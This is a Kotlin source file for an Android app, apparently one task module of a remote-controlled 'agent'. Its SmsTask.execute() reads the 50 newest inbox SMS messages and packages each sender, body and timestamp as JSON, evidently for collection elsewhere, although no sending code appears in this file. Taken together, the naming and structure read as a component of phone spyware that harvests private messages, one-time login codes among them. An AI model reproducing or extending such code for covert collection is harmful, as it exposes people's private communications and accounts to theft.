package com.uranium.agent.tasks

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject

object SmsTask {
    fun execute(context: Context): JSONObject {
        val result = JSONObject()
        val array = JSONArray()
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50")
            cursor?.use {
                val addressIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("address", if (addressIdx >= 0) it.getString(addressIdx) else "")
                        put("body", if (bodyIdx >= 0) it.getString(bodyIdx) else "")
                        put("date", if (dateIdx >= 0) it.getLong(dateIdx) else 0L)
                    }
                    array.put(obj)
                }
            }
            result.put("sms", array)
        } else {
            result.put("error", "Permission denied")
        }
        return result
    }
}
